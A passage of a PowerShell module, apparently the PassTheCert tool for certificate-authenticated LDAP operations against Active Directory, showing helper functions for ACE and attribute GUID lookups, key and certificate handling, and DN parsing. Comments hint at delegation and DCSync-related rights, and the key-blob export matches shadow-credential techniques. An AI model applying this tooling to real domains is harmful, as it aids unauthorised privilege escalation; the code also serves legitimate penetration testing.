            https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-entries

        .LINK

            https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/1522b774-6464-41a3-87a5-1e5633c3fbbb
        
        .LINK 

            https://learn.microsoft.com/en-us/windows/win32/adschema/control-access-rights
        
        .LINK

            Any link provided in `PrincipalTo*.txt`

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$false, HelpMessage="Enter the Access Right Name (i.e. ObjectAceType) of the ACE to translate into GUID (refer to '[MS-ADTS]: 5.1.3.2.1 Control Access Rights', and 'PrincipalTo*.txt')")]
        [PSDefaultValue(Help="Empty string to handle ACEs without ObjectAceType (i.e. with access mask(s) only, such as 'GenericAll')")]
        [System.String]$AccessRightName = ''
    )

    #Write-Verbose "[*] Retrieving GUID Associated With Access Right Name (i.e. ObjectAceType) '$AccessRightName'..."

    $ACEAccessRights = _Helper-GetACEAccessRightsArray

    foreach ($ACEAccessRight in $ACEAccessRights.GetEnumerator()) {
        if ($ACEAccessRight.Key.ToUpper() -eq $AccessRightName.Trim().ToUpper()) {
            #Write-Verbose "[+] Successfully Retrieved '$($ACEAccessRight.Value)' Name Associated With Access Right Name (i.e. ObjectAceType) '$AccessRightName' !"
            return $ACEAccessRight.Value;
        }
    }

    # If not found, returning an empty GUID to deal with ACEs that doesn't have 'ObjectAceType' attribute (e.g. 'GenericAll'), hence being set to None.
    #Write-Verbose "[!] Couldn't Find Any GUID Associated With Access Right Name (i.e. ObjectAceType) '$AccessRightName' ! Returning [Guid]::Empty To Handle ACEs Without 'ObjectAceType' Attribute..."
    return [Guid]::Empty;
}


function _Helper-GetNameOfACEAccessRightGUID {
    
    <#

        .SYNOPSIS

            Returns the Name associated with the specified ACE Access Right GUID.

        .PARAMETER AccessRightGUID

            [System.String] 
            
            The Access Right GUID of the ACE.

        .EXAMPLE

            _Helper-GetNameOfACEAccessRightGUID -AccessRightGUID '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'

            Returns `DS-Replication-Get-Changes-All`

        .EXAMPLE

            _Helper-GetNameOfACEAccessRightGUID -AccessRightGUID 'e48d0154-bcf8-11d1-8702-00c04fb96050'

            Returns `Public-Information`

        .EXAMPLE

            _Helper-GetNameOfACEAccessRightGUID -AccessRightGUID '12345678-1234-1234-1234-123456789012'

            Returns `$null`

        .OUTPUTS

            [System.String]
            
            The Name associated with the specified ACE Access Right GUID.

            - Exception: 
            - Returns $null if not found, to deal with ACEs that doesn't have `ObjectAceType` attribute (e.g. `GenericAll`), hence being set to None.
            - You may see such ACE entries into `PrincipalTo*.txt`, where `ObjectAceType` is unset (i.e. set no None).
            

        .LINK

            https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-entries

        .LINK

            https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/1522b774-6464-41a3-87a5-1e5633c3fbbb
        
        .LINK 

            https://learn.microsoft.com/en-us/windows/win32/adschema/control-access-rights
        
        .LINK

            Any link provided in `PrincipalTo*.txt`

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the Access Right GUID (i.e. ObjectAceType) of the ACE to translate into Name")]
        [System.String]$AccessRightGUID
    )

    #Write-Verbose "[*] Retrieving Name Associated With Access Right GUID (i.e. ObjectAceType) '$AccessRightGUID'..."

    $ACEAccessRights = _Helper-GetACEAccessRightsArray
    
    foreach ($ACEAccessRight in $ACEAccessRights.GetEnumerator()) {
        if ($ACEAccessRight.Value.ToUpper() -eq $AccessRightGUID.Trim().ToUpper()) {
            #Write-Verbose "[+] Successfully Retrieved '$($ACEAccessRight.Key)' Name Associated With Access Right GUID (i.e. ObjectAceType) '$AccessRightGUID' !"
            return $ACEAccessRight.Key;
        }
    }

    # If not found, returning $null...
    #Write-Verbose "[!] Couldn't Find Any Name Associated With Access Right GUID '$AccessRightGUID' (i.e. ObjectAceType) ! Returning `$null..."
    return $null;
}


function _Helper-GetGUIDOfLDAPAttributeName {
    
    <#

        .SYNOPSIS

            Returns the GUID associated with the specified LDAP Attribute's lDAPDisplayName.

        .PARAMETER LDAPAttributeName

            [System.String]
            
            The Attribute's lDAPDisplayName (e.g. serviceprincipalname).

        .EXAMPLE

            _Helper-GetGUIDOfLDAPAttributeName -LDAPAttributeName 'cOMClassID'

            Returns `bf96793b-0de6-11d0-a285-00aa003049e2`

        .EXAMPLE

            _Helper-GetGUIDOfLDAPAttributeName -LDAPAttributeName 'msDS-AllowedToActOnBehalfOfOtherIdentity'

            Returns `3f78c3e5-f79a-46bd-a0b8-9d18116ddc79` (Hmmm... Wh4t 4r3 y4' l0ok1n' 4 ??)

        .EXAMPLE

            _Helper-GetGUIDOfLDAPAttributeName -LDAPAttributeName 'msDS-ThereIsAbsolutelyNo42WayIMayExist_EVER!'

            Returns `[Guid]::Empty`

        .OUTPUTS

            [System.String] 
            
            The GUID associated with the specified Attribute's lDAPDisplayName.

        .LINK

            https://learn.microsoft.com/en-us/windows/win32/adschema/attributes-all

        .LINK

            https://itpro-tips.com/liste-des-guid-du-schema-active-directory/
        
        .LINK

            Any (working) link provided in `ADAttributeGUIDs.csv`

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the Attribute's lDAPDisplayName (e.g. serviceprincipalname) to translate into GUID")]
        [System.String]$LDAPAttributeName
    )

    #Write-Verbose "[*] Retrieving GUID Associated With LDAP Attribute Name '$LDAPAttributeName'..."

    $LDAPAttributes = _Helper-GetLDAPAttributesArray

    foreach ($LDAPAttribute in $LDAPAttributes.GetEnumerator()) {
        if ($LDAPAttribute.Key.ToUpper() -eq $LDAPAttributeName.Trim().ToUpper()) {
            #Write-Verbose "[+] Successfully Retrieved '$($LDAPAttribute.Value)' Name Associated With lDAPDisplayName '$LDAPAttributeName' !"
            return $LDAPAttribute.Value;
        }
    }

    #Write-Verbose "[!] Couldn't Find Any GUID Associated With LDAP Attribute Name '$LDAPAttributeName' ! Returning [Guid]::Empty..."
    return [Guid]::Empty;
}


function _Helper-GetNameOfLDAPAttributeGUID {
    
    <#

        .SYNOPSIS

            Returns the Name associated with the specified LDAP Attribute's GUID.

        .PARAMETER LDAPAttributeGUID

            [System.String] 
            
            The GUID of the LDAP Attribute
    
        .EXAMPLE

            _Helper-GetNameOfLDAPAttributeGUID -LDAPAttributeGUID 'bf96793b-0de6-11d0-a285-00aa003049e2'

            Returns `cOMClassID`

        .EXAMPLE

            _Helper-GetNameOfLDAPAttributeGUID -LDAPAttributeGUID '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79'

            Returns `msDS-AllowedToActOnBehalfOfOtherIdentity` (Hmmm... Wh4t 4r3 y4' l0ok1n' 4 ??)

        .EXAMPLE

            _Helper-GetNameOfLDAPAttributeGUID -LDAPAttributeGUID '12345678-1234-1234-1234-123456789012'

            Returns `$null`

        .OUTPUTS

            [System.String]
            
            The Name associated with the specified LDAP Attribute's GUID.

            - Exception: 
            - Returns $null if not found, to deal with SDDLs that doesn't have `ObjectAceType` attribute (e.g. `GenericAll`), hence being set to None.

        .LINK

            https://learn.microsoft.com/en-us/windows/win32/adschema/attributes-all

        .LINK

            https://itpro-tips.com/liste-des-guid-du-schema-active-directory/
        
        .LINK

            Any (working) link provided in `ADAttributeGUIDs.csv`

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Attribute GUID to translate into Name")]
        [System.String]$LDAPAttributeGUID
    )

    #Write-Verbose "[*] Retrieving Name Associated With LDAP Attribute GUID '$LDAPAttributeGUID'..."

    $LDAPAttributes = _Helper-GetLDAPAttributesArray
    
    foreach ($LDAPAttribute in $LDAPAttributes.GetEnumerator()) {
        if ($LDAPAttribute.Value.ToUpper() -eq $LDAPAttributeGUID.Trim().ToUpper()) {
            #Write-Verbose "[+] Successfully Retrieved '$($LDAPAttribute.Key)' Name Associated With LDAP Attribute GUID '$LDAPAttributeGUID' !"
            return $LDAPAttribute.Key;
        }
    }

    # If not found, returning $null...
    #Write-Verbose "[!] Couldn't Find Any Name Associated With LDAP Attribute GUID '$LDAPAttributeGUID' ! Returning `$null..."
    return $null;
}




# ========================================================
# ===         Helper Functions (Certificates)          ===
# ========================================================

function _Helper-ExportRSAPublicKeyBCrypt {
    
    <#
    
        .SYNOPSIS

            Returns the BCRYPT_RSAKEY_BLOB of a certificate's RSA public key

        .PARAMETER Certificate

            [System.Security.Cryptography.X509Certificates.X509Certificate2]

            The certificate

        .EXAMPLE

            _Helper-ExportRSAPublicKeyBCrypt -Certificate $Certificate

            Returns the BCRYPT_RSAKEY_BLOB of the `$Certificate`'s RSA public key

        .OUTPUTS

            [byte[]]
            
            The BCRYPT_RSAKEY_BLOB of a certificate's RSA public key

        .LINK
            https://github.com/MichaelGrafnetter/DSInternals/blob/af4f0112a7baf57616ef515281f5c7344bcc49ed/Src/DSInternals.Common/Extensions/RSAExtensions.cs#L113-L145

    #>

    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the certificate from which to export the BCRYPT_RSAKEY_BLOB")]
        [System.Security.Cryptography.X509Certificates.X509Certificate2]$Certificate
    )

    # https://github.com/MichaelGrafnetter/DSInternals/blob/af4f0112a7baf57616ef515281f5c7344bcc49ed/Src/DSInternals.Common/Extensions/RSAExtensions.cs#L29
    $BCryptRSAPublicKeyFormat = [System.Security.Cryptography.CngKeyBlobFormat]::new("RSAPUBLICBLOB")
    
    # https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.x509certificates.x509certificate.getpublickey
    # https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.x509certificates.publickey.getrsapublickey
    $rsa = $Certificate.PublicKey.GetRSAPublicKey()

    if ($rsa -is [System.Security.Cryptography.RSACng]) {
        $key = $rsa.Key
        return $key.Export($BCryptRSAPublicKeyFormat)
    } else {
        $publicKeyParameters = $rsa.ExportParameters($false)
        $rsaCngNew = [System.Security.Cryptography.RSACng]::new()
        $rsaCngNew.ImportParameters($publicKeyParameters)
        return $rsaCngNew.Key.Export($BCryptRSAPublicKeyFormat)
    }
}



function _Helper-ExportRSAPublicKeyDER {
    
    <#
    
        .SYNOPSIS

            Returns the DER format of a certificate's RSA public key

        .PARAMETER Certificate

            [System.Security.Cryptography.X509Certificates.X509Certificate2]

            The certificate

        .EXAMPLE

            _Helper-ExportRSAPublicKeyDER -Certificate $Certificate

            Returns the DER format of the `$Certificate`'s RSA public key

        .OUTPUTS

            [byte[]]
            
            The DER format of a certificate's RSA public key

        .LINK
            https://github.com/MichaelGrafnetter/DSInternals/blob/af4f0112a7baf57616ef515281f5c7344bcc49ed/Src/DSInternals.Common/Extensions/RSAExtensions.cs#L163-L171

    #>

    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the certificate from which to export the DER format of the RSA public key")]
        [System.Security.Cryptography.X509Certificates.X509Certificate2]$Certificate
    )

    return $Certificate.PublicKey.EncodedKeyValue.RawData
}



function _Helper-GenerateSelfSignedCertificate() {
    
    <#
    
        .SYNOPSIS

            Returns a self-signed certificate

        .PARAMETER CN

            [System.String]

            The CN of the certificate's subject (e.g. 'jdoe')

        .PARAMETER AddYears

            [System.Int32]

            The number of years the certificate is valid for (e.g. 2)

            - If not specified, defaults to 1

        .EXAMPLE

            _Helper-GenerateSelfSignedCertificate -CN 'jdoe'

            Returns a generated self-signed certificate whose subject field is 'jdoe', valid for 1 year (default)

        .EXAMPLE

            _Helper-GenerateSelfSignedCertificate -CN 'jdoe' -AddYear 30

            Returns a generated self-signed certificate whose subject field is 'jdoe', valid for 30 years

        .OUTPUTS

             [System.Security.Cryptography.X509Certificates.X509Certificate2]
            
            A self-signed certificate

        .LINK

            https://github.com/eladshamir/Whisker/blob/3940c5777aba89a3c49d98938629ebc2ea2c759f/Whisker/Program.cs#L154-L160

    #>

    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the certificate's subject CN")]
        [System.String]$CN,

        [Parameter(Position=1, Mandatory=$false, HelpMessage="Enter the number of year the certificate is valid for")]
        [PSDefaultValue(Help="1 year validity")]
        [System.Int32]$AddYear = 1
    )


    # https://github.com/MichaelGrafnetter/DSInternals/blob/6fe15cab429f51d91e8b281817fa23b13804456c/Documentation/PowerShell/Get-ADKeyCredential.md#example-6
    #return $NewSelfSignedCertificate = New-SelfSignedCertificate `
    #    -Subject $CN `
    #    -KeyLength 2048 `
    #    -KeyExportPolicy 'Exportable','ExportableEncrypted' `
    #    -KeyAlgorithm 'RSA' `
    #    -HashAlgorithm 'SHA256' `
    #    -Provider 'Microsoft Strong Cryptographic Provider' `
    #    -CertStoreLocation 'Cert:\CurrentUser\My' `
    #    -NotAfter (Get-Date).AddYears($AddYear) `
    #    -KeyUsageProperty 'All' `
    #    -KeyUsage 'KeyEncipherment','DigitalSignature' `
    #    -TextExtension @(
    #        #"2.5.29.17={text}UPN=$TargetUPN",
    #        '2.5.29.37={text}1.3.6.1.5.5.7.3.1',
    #        '2.5.29.37={text}1.3.6.1.5.5.7.3.2'
    #    )

    # https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.rsacryptoserviceprovider
    $RSA = New-Object System.Security.Cryptography.RSACryptoServiceProvider(
        2048, 
        (New-Object System.Security.Cryptography.CspParameters(
            24, 
            "Microsoft Enhanced RSA and AES Cryptographic Provider", 
            [Guid]::NewGuid().ToString()
        ))
    )

    # https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.x509certificates.certificaterequest
    $CertificateRequest = New-Object System.Security.Cryptography.X509Certificates.CertificateRequest(
        "CN=$CN",
        $RSA,
        [System.Security.Cryptography.HashAlgorithmName]::SHA256, 
        [System.Security.Cryptography.RSASignaturePadding]::Pkcs1
    )
    
    # https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.x509certificates.certificaterequest.createselfsigned
    return $CertificateRequest.CreateSelfSigned(
        [DateTimeOffset]::Now.AddMinutes(-5), 
        [DateTimeOffset]::Now.AddYears($AddYear)
    )
}



function _Helper-ExportCertificateToFile {
    
    <#

        .SYNOPSIS

            Exports a certificate to a file

        .PARAMETER Certificate

            [System.Security.Cryptography.X509Certificates.X509Certificate2]

            The certificate to be exported

        .PARAMETER ExportPath

            [System.String] 
            
            The path of the certificate to be exported

        .PARAMETER ExportContentType

            [System.String] 
            
            The ContentType of the certificate to be exported (among 'Cert', 'SerializedCert', 'Pfx', 'Pkcs12', 'SerializedStore', 'Pkcs7', 'Authenticode') (Optional)
            
            - If not specified, defaults to 'pfx'

        .PARAMETER ExportPassword

            [System.String] 
            
            The password of the certificate to be exported (Optional)

            - If not specified, defaults to '', i.e. passwordless

        .EXAMPLE

            _Helper-ExportCertificateToFile -Certificate $Certificate -ExportPath '.\Certified.pfx' -ExportContentType 'pfx' -ExportPassword 'ExP0rTP@sssw0Rd123!'

            Exports the Certificate $Certificate into the PFX file '.\Certified.pfx', protected with password 'ExP0rTP@sssw0Rd123!'

        .EXAMPLE

            _Helper-ExportCertificateToFile -Certificate $Certificate -ExportPath '.\Certified.pfx' -ExportContentType 'pfx'

            Exports the Certificate $Certificate into the passwordless PFX file '.\Certified.pfx'

        .EXAMPLE

            _Helper-ExportCertificateToFile -Certificate $Certificate -ExportPath '.\Certified.p12' -ExportContentType 'pkcs12' -ExportPassword 'ExP0rTP@sssw0Rd123!'

            Exports the Certificate $Certificate into the PKCS #12 file '.\Certified.p12', protected with password 'ExP0rTP@sssw0Rd123!'

        .EXAMPLE

            _Helper-ExportCertificateToFile -Certificate $Certificate -ExportPath '.\Certified.p12' -ExportContentType 'pkcs12'

            Exports the Certificate $Certificate into the PKCS #12 file '.\Certified.p12', passwordless

        .LINK 

            https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.x509certificates.x509certificate.export
        
        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.x509certificates.x509contenttype

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the certificate to export")]
        [System.Security.Cryptography.X509Certificates.X509Certificate2]$Certificate,

        [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the path of the certificate to export")]
        [System.String]$ExportPath,

        [Parameter(Position=2, Mandatory=$false, HelpMessage="Enter the type of the certificate to export ('Unknown', 'Cert', 'SerializedCert', 'Pfx', 'Pkcs12', 'SerializedStore', 'Pkcs7', or 'Authenticode')")]
        [ValidateSet('Unknown', 'Cert', 'SerializedCert', 'Pfx', 'Pkcs12', 'SerializedStore', 'Pkcs7', 'Authenticode')]
        [PSDefaultValue(Help="Pfx by default")]
        [System.String]$ExportContentType = 'Pfx',

        [Parameter(Position=3, Mandatory=$false, HelpMessage="Enter the password of the certificate to export")]
        [PSDefaultValue(Help="Empty password by default")]
        [System.String]$ExportPassword = ''
    )

    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters

    try {
        if (-not $ExportPassword) {
            $PasswordString = "Passwordless"
            $SecureString = (New-Object System.Security.SecureString)
        } else {
            $PasswordString = "Protected With Password: $ExportPassword"
            $SecureString = (ConvertTo-SecureString $ExportPassword -AsPlainText -Force)
        }

    Write-Verbose "[*] Exporting The Certificate To The File '$ExportPath' Of Type '$ExportContentType', $PasswordString ..."

        switch ($ExportContentType) {
            "Unknown" { $X509ContentType = [System.Security.Cryptography.X509Certificates.X509ContentType]::Unknown; break; } #??
            "Cert" { $X509ContentType = [System.Security.Cryptography.X509Certificates.X509ContentType]::Cert; break; }
            "SerializedCert" { $X509ContentType = [System.Security.Cryptography.X509Certificates.X509ContentType]::SerializedCert; break; }
            "PFX" { $X509ContentType = [System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx; break; }
            "Pkcs12" { $X509ContentType = [System.Security.Cryptography.X509Certificates.X509ContentType]::Pkcs12; break; }
            "SerializedStore" { $X509ContentType = [System.Security.Cryptography.X509Certificates.X509ContentType]::SerializedStore; break; }
            "Pkcs7" { $X509ContentType = [System.Security.Cryptography.X509Certificates.X509ContentType]::Pkcs7; break; }
            "Authenticode" { $X509ContentType = [System.Security.Cryptography.X509Certificates.X509ContentType]::Authenticode; break; }
            Default { Write-Host "[!] X509ContentType '$ExportContentType' Not Recognized !"; return; }
        }

        Set-Content -Path $ExportPath -AsByteStream -Force -Value (
            $Certificate.Export(
                $X509ContentType,
                $SecureString
            )
        )

        #[System.IO.File]::WriteAllBytes(
        #    $ExportPath, 
        #    $Certificate.Export(
        #        $X509ContentType, 
        #        $ExportPassword
        #    )
        #)

        Write-Host "[+] Successfully Exported Certificate To File '$ExportPath' Of Type '$ExportContentType', $PasswordString"

    } catch { Write-Host "[!] Exporting The Certificate To File '$ExportPath' Of Type '$ExportContentType' Failed With Error: $_" }

}


function _Helper-GetCertificateFromFileOrBase64 {
    
    <#

        .SYNOPSIS

            Returns a loaded certificate variable from a file or base64 input

        .PARAMETER Certificate

            [System.String]

            The path or base64 format of the certificate to be loaded

        .PARAMETER CertificatePassword

            [System.String] 
            
            The password of the certificate to be exported (Optional)

            - If not specified, defaults to '', i.e. passwordless

        .EXAMPLE

            _Helper-GetCertificateFromFileOrBase64 -Certificate '.\Certified.pfx'

            Returns the X509Certificate2 certificate extracted from the certificate in file '.\Certified.pfx', passwordless

        .EXAMPLE

            _Helper-GetCertificateFromFileOrBase64 -Certificate '.\Certified.pfx' -CertificatePassword 'CerTifIed@sssw0Rd123!'

            Returns the X509Certificate2 certificate extracted from the certificate in file '.\Certified.pfx', password-protected with 'CerTifIed@sssw0Rd123!'

        .EXAMPLE

            _Helper-GetCertificateFromFileOrBase64 -Certificate 'MIINA...'

            Returns the X509Certificate2 certificate extracted from the certificate with base64 format 'MIINA...', passwordless

        .EXAMPLE

            _Helper-GetCertificateFromFileOrBase64 -Certificate 'MIINA...' -CertificatePassword 'CerTifIed@sssw0Rd123!'

            Returns the X509Certificate2 certificate extracted from the certificate with base64 format 'MIINA...', password-protected with 'CerTifIed@sssw0Rd123!'

        .OUTPUTS

            [System.Security.Cryptography.X509Certificates.X509Certificate2]

            A loaded certificate variable from a file or base64 input

        .LINK 

            https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.x509certificates.x509certificate2

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the certificate's path or base64 format to load")]
        [System.String]$Certificate,

        [Parameter(Position=1, Mandatory=$false, HelpMessage="Enter the password of the certificate to export")]
        [PSDefaultValue(Help="Empty password by default")]
        [System.String]$CertificatePassword = ''
    )

    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters

    
    if ($CertificatePassword) {
        Write-Verbose "[*] Loading Certificate '$Certificate', Protected With Password: $CertificatePassword"
    } else {
        Write-Verbose "[*] Loading Certificate '$Certificate', Passwordless"
    }

    if (Test-Path -Path $Certificate) {
        # File Certificate
        $Result = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(
            $Certificate, 
            $CertificatePassword, 
            [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable
        )

        Write-Host "[+] Successfully Loaded File Certificate !"
    } else {
        # Base64 Certificate
        $Result = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(
            [System.Convert]::FromBase64String($Certificate), 
            $CertificatePassword, 
            [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable
        )

        Write-Host "[+] Successfully Loaded Base64 Certificate !"
    }

    return $Result

}



# ==========================================
# ===    Helper Functions (LDAP Core)    ===
# ==========================================

function _GetIssuerDNFromLdapConnection {
    
    <#
        .SYNOPSIS

            Returns the CA Issuer's Distinguished Name from the established LDAP Connection to which the client certificate-authenticated.

        .PARAMETER LdapConnection

            [System.DirectoryServices.Protocols.LdapConnection] 
            
            The established LDAP Connection Instance.

        .EXAMPLE

            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']

            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.

        .EXAMPLE

            _GetIssuerDNFromLdapConnection -LdapConnection $LdapConnection

            Returns `CN=ADLAB-DC02-CA,DC=X` if the client certificate-authenticated to CA Issuer `CN=ADLAB-DC02-CA,DC=X`

        .OUTPUTS

            [System.String] 
            
            The CA Issuer's Distinguished Name to which the client certificate-authenticated.

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.ldapconnection

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Connection Instance")]
        [ValidateNotNullorEmpty()]
        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection
    )
    
    return ($LdapConnection.ClientCertificates.Issuer) -replace ' ',''

}


function _GetSubjectDNFromLdapConnection {
    
    <#

        .SYNOPSIS

            Returns the Subject's Distinguished Name (i.e. the client's one, who certificate-authenticated) from the established LDAP Connection Instance.

        .PARAMETER LdapConnection

            [System.DirectoryServices.Protocols.LdapConnection] 
            
            The established LDAP Connection Instance.

        .EXAMPLE

            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']

            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.

        .EXAMPLE

            _GetSubjectDNFromLdapConnection -LdapConnection $LdapConnection

            Returns `CN=Administrator,CN=Users,DC=X` if the client who certificate-authenticated is `CN=Administrator,CN=Users,DC=X`

        .OUTPUTS

            [System.String] 
            
            The Subject's Distinguished Name (i.e. the client's one, who certificate-authenticated).

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.ldapconnection

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Connection Instance")]
        [ValidateNotNullorEmpty()]
        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection
    )
    
    return ($LdapConnection.ClientCertificates.Subject) -replace ' ',''
}


function _GetDomainDNOfCAIssuerFromLdapConnection {
    
    <#

        .SYNOPSIS

            Returns the Domain's Distinguished Name from the CA Issuer's Distinguished Name from the established LDAP Connection to which the client certificate-authenticated.

        .PARAMETER LdapConnection

            [System.DirectoryServices.Protocols.LdapConnection] 
            
            The established LDAP Connection Instance.

        .EXAMPLE

            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']

            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.

        .EXAMPLE

            _GetDomainDNOfCAIssuerFromLdapConnection -LdapConnection $LdapConnection

            Returns `DC=X` if the client certificate-authenticated to Issuer `CN=ADLAB-DC02-CA, DC=X`

        .OUTPUTS

            [System.String] 
            
            The Domain's Distinguished Name from the CA Issuer's Distinguished Name to which the client certificate-authenticated.

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.ldapconnection

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Connection Instance")]
        [ValidateNotNullorEmpty()]
        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection
    )
    
    return _Helper-GetDomainDNFromDN -DN $LdapConnection.ClientCertificates.Issuer
}


function _GetDomainDNOfSubjectFromLdapConnection {
    
    <#

        .SYNOPSIS

            Returns the Domain's Distinguished Name from the Subject's Distinguished Name (i.e. the client's one, who certificate-authenticated) from the established LDAP Connection Instance.

        .PARAMETER LdapConnection

            [System.DirectoryServices.Protocols.LdapConnection] 
            
            The established LDAP Connection Instance.

        .EXAMPLE

            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']

            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.

        .EXAMPLE

            _GetDomainDNOfSubjectFromLdapConnection -LdapConnection $LdapConnection

            Returns `DC=X` if the client who certificate-authenticated is `CN=Administrator,CN=Users,DC=X`

        .OUTPUTS

            [System.String] 
            
            The Domain's Distinguished Name from the Subject's Distinguished Name (i.e. the client's one, who certificate-authenticated).

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.ldapconnection

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Connection Instance")]
        [ValidateNotNullorEmpty()]
        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection
    )
    
    return _Helper-GetDomainDNFromDN -DN $LdapConnection.ClientCertificates.Subject
}


function _Helper-GetDNOfIdentityString {
    
    <#
    
        .SYNOPSIS

            Returns the Distinguished Name of the object associated with the specified Identity String (i.e. a Distinguished Name, SID, GUID, or sAMAccountName)

        .PARAMETER LdapConnection

            [System.DirectoryServices.Protocols.LdapConnection] 
            
            The established LDAP Connection Instance.

        .PARAMETER IdentityString

            [System.String]

            The Identity string (i.e. a Distinguished Name, SID, GUID, or sAMAccountName)

        .PARAMETER IdentityDomain

            [System.String]

            The domain of the provided identity string (e.g. `X.LOCAL`)

        .EXAMPLE

            _Helper-GetDNOfIdentityString -LdapConnection $LdapConnection -IdentityString 'CN=Administrator,CN=Users,DC=X'

            Returns the input, i.e. 'CN=Administrator,CN=Users,DC=X'

        .EXAMPLE

            _Helper-GetDNOfIdentityString -LdapConnection $LdapConnection -IdentityString 'S-1-5-21-2539905369-2457893589-779357875-1151' -IdentityDomain 'X.LOCAL'

            Returns the Distinguished Name of the object whose SID is 'S-1-5-21-2539905369-2457893589-779357875-1151' in the domain `X.LOCAL`

        .EXAMPLE

            _Helper-GetDNOfIdentityString -LdapConnection $LdapConnection -IdentityString '7a329ed9-c6e3-f440-af31-69879d5eb26d' -IdentityDomain 'X.LOCAL'

            Returns the Distinguished Name of the object whose GUID is '7a329ed9-c6e3-f440-af31-69879d5eb26d' in the domain `X.LOCAL`

        .EXAMPLE

            _Helper-GetDNOfIdentityString -LdapConnection $LdapConnection -IdentityString 'jdoe' -IdentityDomain 'X.LOCAL'

            Returns the Distinguished Name of the object whose sAMAccountName is `jdoe` in the domain `X.LOCAL`

        .EXAMPLE

            _Helper-GetDNOfIdentityString -LdapConnection $LdapConnection -IdentityString 'computer$' -IdentityDomain 'X.LOCAL'

            Returns the Distinguished Name of the object whose sAMAccountName is `computer$` in the domain `X.LOCAL`

        .OUTPUTS

            [System.String]
            
            The Distinguished Name of the object associated with the specified Identity String (i.e. a Distinguished Name, SID, GUID, or sAMAccountName).

        .LINK 

            https://learn.microsoft.com/en-us/previous-versions/windows/desktop/ldap/distinguished-names

        .LINK 

            https://learn.microsoft.com/en-us/windows/win32/adschema/a-samaccountname

        .LINK

            https://learn.microsoft.com/en-us/windows/win32/ad/naming-properties

        .LINK 

            https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/naming-conventions-for-computer-domain-site-ou

        .LINK

            https://datatracker.ietf.org/doc/html/rfc1123

        .LINK

            https://datatracker.ietf.org/doc/html/rfc4514#section-3

    #>
    
    [CmdletBinding()]
    param(
